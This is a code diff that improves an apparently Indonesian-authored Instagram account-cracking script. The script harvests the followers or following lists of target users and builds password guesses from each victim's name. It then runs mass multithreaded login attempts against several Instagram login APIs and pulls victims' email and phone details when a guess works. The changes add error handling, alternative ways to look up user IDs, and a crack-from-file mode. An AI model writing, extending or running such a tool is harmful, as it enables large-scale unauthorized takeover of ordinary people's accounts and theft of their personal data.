@@ -20,6 +20,8 @@ from rich import print as prints
 Uid, Uuid = [], []
 Ok, Cp, Loop = 0, 0, 0
 xx = 0
+SistemLog = "api.instagram.com"
+
 # Color codes
 WHITE = '\x1b[1;97m'
 RED = '\x1b[1;91m'
@@ -74,6 +76,29 @@ def find_res():
         pass
     return cookie
 
+def test_cookies(coki):
+    """Test if cookies are still valid"""
+    try:
+        # Test with a simple request
+        test_session = requests.Session()
+        test_session.max_redirects = 5
+        response = test_session.get(
+            'https://www.instagram.com/api/v1/web/accounts/login/ajax/',
+            cookies=coki,
+            timeout=10
+        )
+        
+        if response.status_code == 200:
+            print(f"{GREEN}✓ Cookies are valid!{RESET}")
+            return True
+        else:
+            print(f"{RED}✗ Cookies may be expired!{RESET}")
+            return False
+            
+    except Exception as e:
+        print(f"{RED}✗ Error testing cookies: {e}")
+        return False
+
 def Aset_Ig():
     os.system('clear')
     coki = {}
@@ -94,14 +119,21 @@ def Aset_Ig():
                 coki = {'cookie': cookie_str}
         else:
             coki = {'cookie': cookie_input}
+    
     try:
         uid = re.search('ds_user_id=(\\d+)', str(coki['cookie'])).group(1)
-        resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki)
+        resp = requests.get(f'https://i.instagram.com/api/v1/users/{uid}/info/', headers=ua, cookies=coki, timeout=10)
         resp.raise_for_status()
         user_data = resp.json().get('user', {})
         full_name = user_data.get('full_name', 'Name Unknown')
         follower_count = user_data.get('follower_count', 0)
         open('data/cookie.txt', 'w').write(coki['cookie'])
+        
+        # Test cookies
+        if not test_cookies(coki):
+            print(f"{YELLOW}Warning: Cookies may not work properly. Consider updating them.")
+            time.sleep(2)
+            
         return coki, full_name, follower_count
     except Exception as e:
         print(f"{RED}Invalid cookies or error: {e}")
@@ -123,7 +155,7 @@ def Menu():
 {CYAN}╰──────────────────────╯{CYAN}╰───────────────╯{CYAN}╰─────────────────────────╯""")
     print(f"{GREEN}{WHITE}Username :{GREEN} {nama[:8]}\n{WHITE}Followers : {GREEN}{fol}")
     
-    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
+    print(f"\n{RED}[ {YELLOW}Crack Menu {RED}]\n\n{RED}[{WHITE}01{RED}] {CYAN} Crack from followers\n{RED}[{WHITE}02{RED}] {CYAN} Crack from following\n{RED}[{WHITE}03{RED}] {CYAN} Crack from file\n{RED}[{WHITE}00{RED}] {RED} Delete/Change Cookies")
     print(f"{BLUE}═" * 80)
     x = input(f"\n{RED}[{WHITE}+{RED}] {BLUE}Please select a menu option :{YELLOW} ")
 
@@ -134,74 +166,188 @@ def Menu():
     elif x in ['03', '3']:
         crackfile()
     elif x in ['00', '0']:
-        os.system("rm data/cookie.txt")
+        os.system("rm -rf data/cookie.txt")
         prints(f"{GREEN}Successfully deleted cookies")
         exit()
+    else:
+        print(f"{RED}Invalid option!")
+        time.sleep(1)
+        Menu()
 
 def crackfile():
     try:
         nu = input(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Enter Your File Name: {PURPLE}")
+        if not os.path.isfile(nu):
+            print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
+            return Menu()
+            
         with open(nu, 'r') as file:
             for line in file:
-                Uuid.append(line.strip())
+                line = line.strip()
+                if line:
+                    Uuid.append(line)
         print(f"{PURPLE}[{WHITE}+{PURPLE}] {WHITE}Total IDs : {len(Uuid)}")
-        MetodeType()
-    except FileNotFoundError:
-        print(f"{PURPLE}[{RED}+{PURPLE}] {RED}File Not Found.")
-        exit()
+        if len(Uuid) > 0:
+            MetodeType()
+        else:
+            print(f"{RED}No valid IDs found in file!")
+            return Menu()
     except Exception as e:
         print(f"{PURPLE}[{RED}+{PURPLE}] {RED}Error: {e}")
-        exit()
+        return Menu()
+
+def get_user_id_methods(username, cookies):
+    """Try multiple methods to get user ID"""
+    
+    # Method 1: Try using the official API
+    try:
+        url = f'https://i.instagram.com/api/v1/users/web_profile_info/?username={username}'
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104',
+            'x-ig-app-id': '1217981644879628',
+            'Accept': 'application/json'
+        }
+        response = requests.get(url, headers=headers, cookies=cookies, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            if 'data' in data and 'user' in data['data']:
+                user_id = data['data']['user'].get('id')
+                if user_id:
+                    return user_id
+    except Exception as e:
+        pass
+    
+    # Method 2: Try using the graphql API
+    try:
+        url = 'https://www.instagram.com/graphql/query/'
+        params = {
+            'query_hash': 'c9100bf9110dd6361671f113dd02e7d6',
+            'variables': json.dumps({'username': username})
+        }
+        response = requests.get(url, params=params, cookies=cookies, timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            if 'data' in data and 'user' in data['data']:
+                user_id = data['data']['user'].get('id')
+                if user_id:
+                    return user_id
+    except Exception as e:
+        pass
+    
+    # Method 3: Try scraping with limited redirects
+    try:
+        session = requests.Session()
+        session.max_redirects = 3
+        response = session.get(f'https://www.instagram.com/{username}/', cookies=cookies, timeout=10)
+        
+        if response.status_code == 200:
+            # Try to find user_id in the page source
+            patterns = [
+                r'"user_id":"(\d+)"',
+                r'"profilePage_(\d+)"',
+                r'"id":"(\d+)","username":"' + username + '"',
+                r'{"id":"(\d+)","username":"' + username + '"',
+                r'"id":"(\d+)"[^}]*"username":"' + username + '"'
+            ]
+            
+            for pattern in patterns:
+                match = re.search(pattern, response.text)
+                if match:
+                    return match.group(1)
+                    
+    except Exception as e:
+        pass
+    
+    return None
 
 def dumps(cintil, typess):
-    global xx
-    xx = 0  # Initialize xx here
+    global xx, Uuid
+    xx = 0
+    
+    # Test cookies first
+    if not test_cookies(cintil):
+        print(f"{YELLOW}Warning: Your cookies may be invalid. Proceeding anyway...")
+        time.sleep(1)
     
     xyz = []
     if 'csrftoken' not in str(cintil):
         try:
-            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil).json()
-            token = memek['config']['csrf_token']
+            memek = requests.get('https://www.instagram.com/data/shared_data/', cookies=cintil, timeout=10)
+            memek.raise_for_status()
+            token = memek.json()['config']['csrf_token']
             cintil['cookie'] += ';csrftoken=%s;' % token
         except Exception as e:
             os.system('rm -rf data/cookie.txt')
             exit(f'\n{WHITE}[{YELLOW}!{WHITE}] Csrftoken not available, dump will not run: {e}')
     
-    lemes = open('data/cookie.txt', 'r').read()
-    prints(panel(f"\n{CYAN}Enter instagram usernames, use commas for mass cracking", style="Purple"))
-    users = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").split(',')
+    prints(panel(f"\n{CYAN}Enter instagram usernames, use commas for mass cracking\nExample: user1,user2,user3", style="Purple"))
+    users_input = input(f"{RED}[{WHITE}+{RED}] {BLUE}Username :{YELLOW} ").strip()
+    
+    if not users_input:
+        print(f"{RED}No username entered!")
+        return Menu()
+    
+    users = [u.strip() for u in users_input.split(',') if u.strip()]
+    
+    print(f"\n{YELLOW}Fetching user IDs...")
     
     try:
         for y in users:
-            y = y.strip()
-            req = requests.get(f'https://www.instagram.com/{y}/', cookies=cintil).text
-            uid = re.search('"user_id":"(\\d+)"', str(req))
-            if uid:
-                uid = uid.group(1)
-                if uid not in xyz:
-                    xyz.append(uid)
+            print(f"{WHITE}Fetching user ID for: {CYAN}{y}")
+            
+            user_id = get_user_id_methods(y, cintil)
+            
+            if user_id:
+                if user_id not in xyz:
+                    xyz.append(user_id)
+                    print(f"{GREEN}✓ Found user ID: {user_id} for {y}")
+            else:
+                print(f"{RED}✗ Could not find user ID for: {y}")
+                
+            # Small delay between requests
+            time.sleep(0.5)
+                
     except Exception as e:
         print(f"{RED}Error getting user IDs: {e}")
-        return
+        return Menu()
+    
+    if not xyz:
+        print(f"{RED}No valid user IDs found! Make sure the usernames are correct.")
+        time.sleep(2)
+        return Menu()
+    
+    print(f"\n{GREEN}Found {len(xyz)} valid user IDs")
     
     try:
         mode = 'followers' if typess else 'following'
+        print(f"\n{YELLOW}Starting to dump {mode}...")
+        
         for kintil in xyz:
-            print(f"\n{YELLOW}Starting to dump {mode} for user ID: {kintil}")
+            print(f"\n{WHITE}Processing user ID: {CYAN}{kintil}")
             if typess:
                 Graphql(True, kintil, cintil['cookie'], '')
             else:
                 Graphql(False, kintil, cintil['cookie'], '')
+                
+            # Add delay between users to avoid rate limiting
+            time.sleep(1)
+            
     except Exception as e:
         print(f"{RED}Error during dump: {e}")
     
     print(f"\n{GREEN}Total users collected: {len(Uuid)}")
     print("")
+    
     if len(Uuid) > 0:
+        print(f"{GREEN}Collected {len(Uuid)} users successfully!")
+        time.sleep(1)
         MetodeType()
     else:
-        print(f"{RED}No users collected. Check if the target accounts are private.")
-        exit()
+        print(f"{RED}No users collected. Check if the target accounts are private or have no {mode}.")
+        time.sleep(2)
+        Menu()
 
 def Graphql(typess, userid, cokie, after):
     global xx, Uuid
@@ -212,21 +358,49 @@ def Graphql(typess, userid, cokie, after):
         xx = 0
     
     api = "https://www.instagram.com/graphql/query/"
-    csr = 'variables={"id":"%s","first":24,"after":"%s"}' % (userid, after)
-    mek = "query_hash=58712303d941c6855d4e888c5f0cd22f&{}".format(csr) if not typess else "query_hash=37479f2b8209594dde7facb0d904896a&{}".format(csr)
+    
+    # Use the correct query hash for followers/following
+    if typess:
+        # Followers
+        query_hash = "37479f2b8209594dde7facb0d904896a"
+    else:
+        # Following
+        query_hash = "58712303d941c6855d4e888c5f0cd22f"
+    
+    variables = {
+        "id": userid,
+        "first": 50,  # Increased to get more results per request
+        "after": after
+    }
+    
+    params = {
+        'query_hash': query_hash,
+        'variables': json.dumps(variables)
+    }
     
     try:
         ptk = {
             "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104",
-            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-            "cookie": cokie
+            "accept": "application/json",
+            "cookie": cokie,
+            "x-ig-app-id": "1217981644879628"
         }
-        req = requests.get(api, params=mek, headers=ptk, timeout=30)
+        
+        # Add timeout and limit redirects
+        session = requests.Session()
+        session.max_redirects = 5
+        
+        req = session.get(api, params=params, headers=ptk, timeout=30)
         req.raise_for_status()
         req_json = req.json()
         
+        # Check for errors
         if 'require_login' in req_json:
-            print(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie')
+            print(f'\n{WHITE}[{YELLOW}!{WHITE}] Invalid Cookie - Need to login')
+            return
+        
+        if 'status' in req_json and req_json['status'] == 'fail':
+            print(f'\n{RED}Request failed: {req_json.get("message", "Unknown error")}')
             return
         
         # Determine the correct key based on typess
@@ -239,7 +413,7 @@ def Graphql(typess, userid, cokie, after):
         
         user_data = req_json['data']['user']
         
-        # Check if the key exists
+        # Check if the user has the requested data
         if khm not in user_data:
             print(f"\n{RED}This user has no visible {khm.replace('edge_', '')} or is private")
             return
@@ -250,29 +424,39 @@ def Graphql(typess, userid, cokie, after):
             print(f"\n{YELLOW}No {khm.replace('edge_', '')} found for this user")
             return
         
+        print(f"\n{GREEN}Found {len(edges)} {khm.replace('edge_', '')} in this batch")
+        
         for xyz in edges:
-            username = xyz['node']['username']
+            username = xyz['node'].get('username', '')
             full_name = xyz['node'].get('full_name', '')
-            xy = username + '|' + full_name
-            if xy not in Uuid:
-                xx += 1
-                Uuid.append(xy)
-                print(f'\r{WHITE}Collecting Uid {RED}{len(Uuid)}{WHITE}                            ', end='', flush=True)
-                time.sleep(0.0009)
+            
+            if username:
+                xy = username + '|' + full_name
+                if xy not in Uuid:
+                    xx += 1
+                    Uuid.append(xy)
+                    print(f'\r{WHITE}Collecting Uid {RED}{len(Uuid)}{WHITE}                            ', end='', flush=True)
+                    time.sleep(0.001)  # Small delay to avoid overwhelming
         
         # Check for pagination
-        end = user_data[khm]['page_info'].get('has_next_page', False)
+        page_info = user_data[khm].get('page_info', {})
+        end = page_info.get('has_next_page', False)
+        
         if end:
-            after = user_data[khm]['page_info'].get('end_cursor', '')
+            after = page_info.get('end_cursor', '')
             if after:
+                print(f"\n{YELLOW}Loading next page...")
+                time.sleep(0.5)  # Add delay between pagination requests
                 Graphql(typess, userid, cokie, after)
                 
     except requests.exceptions.Timeout:
         print(f"\n{RED}Timeout error while fetching {khm.replace('edge_', '')}")
+    except requests.exceptions.TooManyRedirects:
+        print(f"\n{RED}Too many redirects - check your cookies")
     except requests.exceptions.RequestException as e:
         print(f"\n{RED}Network error: {e}")
-    except json.JSONDecodeError:
-        print(f"\n{RED}Invalid JSON response")
+    except json.JSONDecodeError as e:
+        print(f"\n{RED}Invalid JSON response: {e}")
     except KeyError as e:
         print(f"\n{RED}Key error: {e} - Check response structure")
     except Exception as e:
@@ -299,10 +483,19 @@ def MetodeType():
 
 def SetCrack():
     print(f"\n{YELLOW}Cracking in progress, please enable airplane mode \nfor every 100 usernames/id for 5 seconds\n{WHITE}")
+    
+    if len(Uuid) == 0:
+        print(f"{RED}No users to crack!")
+        return Menu()
+    
+    print(f"{GREEN}Starting crack with {len(Uuid)} users...")
+    
     with ThreadPoolExecutor(max_workers=30) as ASF:
         for i in Uuid:
             try:
-                username, name = i.split('|')
+                if '|' not in i:
+                    continue
+                username, name = i.split('|', 1)
                 kontol = Password(name)
                 if SistemLog == "api.instagram.com":
                     ASF.submit(Crack_api, username, kontol)
@@ -312,9 +505,13 @@ def SetCrack():
                     ASF.submit(Crack_w, username, kontol)
                 elif SistemLog == "b.i.instagram.com":
                     ASF.submit(Crack_N, username, kontol)
-            except:
-                pass
-    exit(f' \n\n {GREEN}Cracking completed')
+            except Exception as e:
+                continue
+    
+    print(f' \n\n {GREEN}Cracking completed')
+    print(f"{GREEN}Successful: {Ok}, Checkpoint: {Cp}")
+    time.sleep(3)
+    Menu()
 
 def Password(name):
     xxzx = []
@@ -386,7 +583,7 @@ def data_target(name):
                 'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104 (iPhone16,2; iOS 18.2; en_US; en; scale=3.00; 1170x2532; 510000000)',
                 'x-ig-app-id': '1217981644879628'
             })
-            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers=HEADERS).json()['data']['user']
+            profil_info_target = ses.get(f'https://i.instagram.com/api/v1/users/web_profile_info/?username={y}', headers=HEADERS, timeout=10).json()['data']['user']
             post = profil_info_target["edge_owner_to_timeline_media"]["count"]
             peng = profil_info_target["edge_followed_by"]["count"]
             meng = profil_info_target["edge_follow"]["count"]
@@ -422,9 +619,9 @@ def Crack_api(username, memek):
         try:
             ses = requests.Session()
             cok = ses.get('https://www.instagram.com/api/v1/web/accounts/login/ajax/',
-                          headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104'}).cookies.get_dict()
+                          headers={'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 instagram 360.0.0.33.104'}, timeout=10).cookies.get_dict()
             cooki = ("; ").join([f"{key}={value}" for key, value in cok.items()])
-            csrf = list(ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/').cookies.items())[0][1]
+            csrf = list(ses.get('https://i.instagram.com/api/v1/web/accounts/login/ajax/', timeout=10).cookies.items())[0][1]
             headers = {
                 'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 26_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/23F81 instagram 317.0.4.27.109 (iPhone18,1; iOS 26_5_1; en_US; en; scale=3.00; 960x2079; 562830928) NW/3',
                 'Content-Type': 'application/x-www-form-urlencoded',
@@ -450,7 +647,7 @@ def Crack_api(username, memek):
                 'Cookie': cooki
             }
             data = f'enc_password=%23PWD_instagram_BROWSER%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}&optIntoOneTap=false&queryParams=%7B%22next%22%3A%22%2F%22%2C%22source%22%3A%22mobile_nav%22%7D&trustedDeviceRecords=%7B%7D&username={urllib.request.quote(str(username))}'
-            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data)
+            response = ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', headers=headers, data=data, timeout=30)
             if 'userId' in str(response.text):
                 kuki = ";".join([str(x) + "=" + str(y) for x, y in ses.cookies.get_dict().items()])
                 post, peng, meng, mail, fullname, fbid, phone = data_target(username)
@@ -473,6 +670,8 @@ def Crack_api(username, memek):
                 continue
         except requests.exceptions.ConnectionError:
             time.sleep(20)
+        except Exception as e:
+            continue
     Loop += 1
 
 def Crack_i(username, memek):
@@ -512,7 +711,7 @@ def Crack_i(username, memek):
                 'Connection': 'keep-alive',
                 'Content-Length': str(len(("&").join([ "%s=%s" % (x, y) for x, y in data.items() ])))
             })
-            response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data=data)
+            response = ses.post('https://i.instagram.com/api/v1/qe/sync/', data=data, timeout=30)
             try:
                 _csrftoken = ses.cookies.get_dict()['csrftoken']
             except:
@@ -524,7 +723,7 @@ def Crack_i(username, memek):
                 'Connection': 'keep-alive',
             })
             data2 = f'signed_body=c47e37e1131fb044652977e468f13e6139bbd66e437069921457f7afb70bcdba.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22_csrftoken%22%3A%22{urllib.request.quote(str(_csrftoken))}%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22password%22%3A%22{urllib.request.quote(str(password))}%22%2C%22login_attempt_count%22%3A%221%22%7D&ig_sig_key_version=4'
-            response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=data2, allow_redirects=True)
+            response2 = ses.post('https://i.instagram.com/api/v1/accounts/login/', data=data2, allow_redirects=True, timeout=30)
             if 'logged_in_user' in response2.text or 'sessionid' in ses.cookies.get_dict().keys():
                 try:
                     ig_set_authorization = response2.headers['ig-set-authorization']
@@ -550,6 +749,8 @@ def Crack_i(username, memek):
                 continue
         except requests.exceptions.ConnectionError:
             time.sleep(20)
+        except Exception as e:
+            continue
     Loop += 1
 
 def Crack_w(username, memek):
@@ -598,7 +799,7 @@ def Crack_w(username, memek):
                 'x-fb-client-ip': 'True'
             })
             data = (f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_instagram%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(username))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{_hash.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{family_device_id}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=5f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73')
-            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True)
+            response = ses.post('https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data=data, allow_redirects=True, timeout=30)
             resp_text = response.text.replace('\\', '')
             if 'Bearer IGT:2:' in resp_text and '"pk_id":' in resp_text:
                 try:
@@ -627,6 +828,8 @@ def Crack_w(username, memek):
                 continue
         except requests.exceptions.ConnectionError:
             time.sleep(20)
+        except Exception as e:
+            continue
     Loop += 1
 
 def Crack_N(username, memek):
@@ -672,7 +875,7 @@ def Crack_N(username, memek):
                 'x-fb-client-ip': 'True'
             })
             data = f'signed_body=SIGNATURE.%7B%22country_codes%22%3A%22%5B%7B%5C%22country_code%5C%22%3A%5C%2262%5C%22%2C%5C%22source%5C%22%3A%5B%5C%22default%5C%22%5D%7D%5D%22%2C%22phone_id%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22enc_password%22%3A%22%23PWD_instagram%3A0%3A{str(int(datetime.datetime.now().timestamp()))}%3A{urllib.request.quote(str(password))}%3D%22%2C%22username%22%3A%22{urllib.request.quote(str(username))}%22%2C%22adid%22%3A%22{urllib.request.quote(str(uuid.uuid4()))}%22%2C%22guid%22%3A%22{urllib.request.quote(str(device_id))}%22%2C%22device_id%22%3A%22android-{urllib.request.quote(str(_hash.hexdigest()[:16]))}%22%2C%22google_tokens%22%3A%22%5B%5D%22%2C%22login_attempt_count%22%3A%220%22%7D'
-            response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data)
+            response = ses.post('https://b.i.instagram.com/api/v1/accounts/login/', data=data, timeout=30)
             if 'logged_in_user' in response.text and '"pk_id":' in response.text:
                 ig_set_authorization = response.headers.get('ig-set-authorization')
                 Ok += 1
@@ -691,6 +894,8 @@ def Crack_N(username, memek):
                 continue
         except requests.exceptions.ConnectionError:
             time.sleep(20)
+        except Exception as e:
+            continue
     Loop += 1
 
 if __name__ == '__main__':
@@ -704,4 +909,7 @@ if __name__ == '__main__':
         print('Connection Close')
     except KeyboardInterrupt:
         print(f"\n{RED}Exiting...")
+        sys.exit()
+    except Exception as e:
+        print(f"{RED}Error: {e}")
         sys.exit()
